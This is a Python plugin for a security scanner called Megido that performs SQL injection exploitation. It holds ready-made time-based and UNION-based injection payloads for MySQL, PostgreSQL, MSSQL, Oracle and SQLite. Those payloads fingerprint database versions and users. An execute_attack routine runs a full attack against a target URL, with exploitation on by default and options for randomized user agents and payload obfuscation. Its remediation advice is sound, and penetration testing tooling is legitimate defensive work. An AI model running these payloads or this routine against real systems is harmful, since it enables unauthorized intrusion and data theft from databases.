"""
SQL Injection Exploit Plugin

This plugin provides exploit capabilities for SQL Injection vulnerabilities.
It integrates with Megido's existing sqli_engine to provide comprehensive
SQL injection testing and exploitation.
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_generator import get_payload_generator

# Try to import the SQL injection engine if available
try:
    from sql_attacker.sqli_engine import SQLInjectionEngine
    HAS_SQLI_ENGINE = True
except ImportError:
    HAS_SQLI_ENGINE = False
    logging.warning("SQL Injection Engine not available. Plugin will use basic payloads only.")

logger = logging.getLogger(__name__)


class SQLInjectionPlugin(ExploitPlugin):
    """
    SQL Injection exploit plugin.
    
    This plugin provides:
    - Payload generation for various SQL injection types
    - Error-based SQL injection detection
    - Time-based blind SQL injection detection
    - Database fingerprinting
    - Data extraction and exploitation
    
    The plugin integrates with Megido's existing SQLInjectionEngine for
    comprehensive testing capabilities.
    """
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'sqli'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'SQL Injection Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Comprehensive SQL Injection exploit plugin supporting error-based, '
            'time-based, and union-based injection techniques across multiple '
            'database types (MySQL, PostgreSQL, MSSQL, Oracle, SQLite).'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '1.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate SQL injection payloads based on context.
        
        Args:
            context: Optional context containing:
                    - database_type: Target database type ('mysql', 'postgresql', etc.)
                    - injection_type: Type of injection ('error', 'time', 'union', 'boolean')
                    - parameter_type: Type of parameter being tested
        
        Returns:
            List of SQL injection payload strings
        """
        context = context or {}
        payload_gen = get_payload_generator()
        
        # Get database-specific payloads
        db_type = context.get('database_type', 'basic')
        injection_type = context.get('injection_type', 'all')
        
        payloads = []
        
        # Get base payloads from payload generator
        base_payloads = payload_gen.get_payloads('sqli', {'database_type': db_type})
        payloads.extend(base_payloads)
        
        # Add injection-type-specific payloads
        if injection_type in ('all', 'error'):
            # Error-based payloads already included in base_payloads
            pass
        
        if injection_type in ('all', 'time') and db_type != 'basic':
            # Add time-based payloads
            time_payloads = self._get_time_based_payloads(db_type)
            payloads.extend(time_payloads)
        
        if injection_type in ('all', 'union'):
            # Add union-based payloads
            union_payloads = self._get_union_based_payloads(db_type)
            payloads.extend(union_payloads)
        
        return payloads
    
    def _get_time_based_payloads(self, db_type: str) -> List[str]:
        """Get time-based blind SQL injection payloads."""
        time_payloads = {
            'mysql': [
                "' AND SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "') AND SLEEP(5)--",
                "' OR SLEEP(5)--",
            ],
            'postgresql': [
                "' AND pg_sleep(5)--",
                "1' AND pg_sleep(5)--",
                "') AND pg_sleep(5)--",
            ],
            'mssql': [
                "'; WAITFOR DELAY '00:00:05'--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "'); WAITFOR DELAY '00:00:05'--",
            ],
            'oracle': [
                "' AND DBMS_LOCK.SLEEP(5)--",
                "1' AND DBMS_LOCK.SLEEP(5)--",
                "') AND DBMS_LOCK.SLEEP(5)--",
            ],
        }
        return time_payloads.get(db_type, [])
    
    def _get_union_based_payloads(self, db_type: str) -> List[str]:
        """Get union-based SQL injection payloads."""
        union_payloads = {
            'mysql': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT user(),database()--",
            ],
            'postgresql': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT version(),NULL--",
                "' UNION SELECT current_user,current_database()--",
            ],
            'mssql': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT SYSTEM_USER,DB_NAME()--",
            ],
            'oracle': [
                "' UNION SELECT NULL FROM DUAL--",
                "' UNION SELECT NULL,NULL FROM DUAL--",
                "' UNION SELECT banner,NULL FROM v$version--",
            ],
            'sqlite': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT sqlite_version(),NULL--",
            ],
        }
        return union_payloads.get(db_type, union_payloads.get('mysql', []))
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute SQL injection attack against the target.
        
        Args:
            target_url: Target URL to attack
            vulnerability_data: Dictionary containing:
                              - parameter: Vulnerable parameter name
                              - method: HTTP method (GET, POST)
                              - params: GET parameters dict (optional)
                              - data: POST data dict (optional)
                              - cookies: Cookies dict (optional)
                              - headers: Headers dict (optional)
            config: Optional configuration:
                   - timeout: Request timeout (default: 30)
                   - verify_ssl: Verify SSL certificates (default: False)
                   - enable_error_based: Enable error-based detection (default: True)
                   - enable_time_based: Enable time-based detection (default: True)
                   - enable_exploitation: Enable exploitation phase (default: True)
                   - use_random_delays: Use random delays (default: False)
                   - randomize_user_agent: Randomize user agent (default: True)
        
        Returns:
            Dictionary containing:
            - success: Boolean indicating if vulnerability was found
            - findings: List of vulnerability findings
            - data: Any extracted data
            - evidence: Evidence of exploitation
            - error: Error message if attack failed
        """
        config = config or {}
        method = vulnerability_data.get('method', 'GET').upper()
        parameter = vulnerability_data.get('parameter')
        params = vulnerability_data.get('params', {})
        data = vulnerability_data.get('data', {})
        cookies = vulnerability_data.get('cookies', {})
        headers = vulnerability_data.get('headers', {})
        
        # Default configuration
        attack_config = {
            'verify_ssl': config.get('verify_ssl', False),
            'use_random_delays': config.get('use_random_delays', False),
            'min_delay': config.get('min_delay', 0.5),
            'max_delay': config.get('max_delay', 2.0),
            'randomize_user_agent': config.get('randomize_user_agent', True),
            'use_payload_obfuscation': config.get('use_payload_obfuscation', False),
        }
        
        result = {
            'success': False,
            'findings': [],
            'data': {},
            'evidence': '',
            'error': None,
        }
        
        try:
            if HAS_SQLI_ENGINE:
                # Use the advanced SQL injection engine
                engine = SQLInjectionEngine(attack_config)
                
                findings = engine.run_full_attack(
                    url=target_url,
                    method=method,
                    params=params,
                    data=data,
                    cookies=cookies,
                    headers=headers,
                    enable_error_based=config.get('enable_error_based', True),
                    enable_time_based=config.get('enable_time_based', True),
                    enable_exploitation=config.get('enable_exploitation', True),
                )
                
                if findings:
                    result['success'] = True
                    result['findings'] = findings
                    result['evidence'] = f"Found {len(findings)} SQL injection vulnerability/vulnerabilities"
                    
                    # Extract any exploitation data
                    for finding in findings:
                        if 'exploitation' in finding and finding['exploitation'].get('is_exploitable'):
                            result['data'] = finding['exploitation']
                            break
                
            else:
                # Fallback to basic payload testing without the engine
                result['success'] = False
                result['error'] = 'SQL Injection Engine not available. Install required dependencies.'
                logger.warning("Attempted to use SQL injection plugin without engine available")
        
        except Exception as e:
            result['error'] = str(e)
            logger.error(f"SQL injection attack failed: {e}")
        
        return result
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for SQL injection."""
        return """
SQL Injection Remediation Advice:

1. Use Parameterized Queries (Prepared Statements):
   - Always use parameterized queries or prepared statements
   - Never concatenate user input directly into SQL queries

2. Input Validation:
   - Validate all user inputs against expected formats
   - Use whitelist validation where possible
   - Reject inputs containing SQL syntax characters

3. Least Privilege:
   - Use database accounts with minimal required privileges
   - Avoid using database admin accounts in applications
   - Implement proper access controls

4. Web Application Firewall (WAF):
   - Deploy a WAF to filter malicious SQL injection attempts
   - Keep WAF rules updated

5. Error Handling:
   - Don't expose detailed error messages to users
   - Log errors securely on the server side
   - Use generic error messages for users

6. Regular Security Testing:
   - Perform regular security assessments
   - Use automated scanning tools
   - Conduct code reviews focusing on database queries
        """
    
    def get_severity_level(self) -> str:
        """Return severity level for SQL injection."""
        return 'critical'
    
    def validate_config(self, config: Dict[str, Any]) -> bool:
        """
        Validate the configuration for this plugin.
        
        Args:
            config: Configuration dictionary
        
        Returns:
            True if configuration is valid, False otherwise
        """
        # Check for valid timeout
        if 'timeout' in config:
            if not isinstance(config['timeout'], (int, float)) or config['timeout'] <= 0:
                logger.error("Invalid timeout value in config")
                return False
        
        # Check for valid delay values
        if 'min_delay' in config and 'max_delay' in config:
            if config['min_delay'] > config['max_delay']:
                logger.error("min_delay cannot be greater than max_delay")
                return False
        
        return True
    
    def get_required_config_keys(self) -> List[str]:
        """Return list of required configuration keys."""
        # All configuration is optional with sensible defaults
        return []
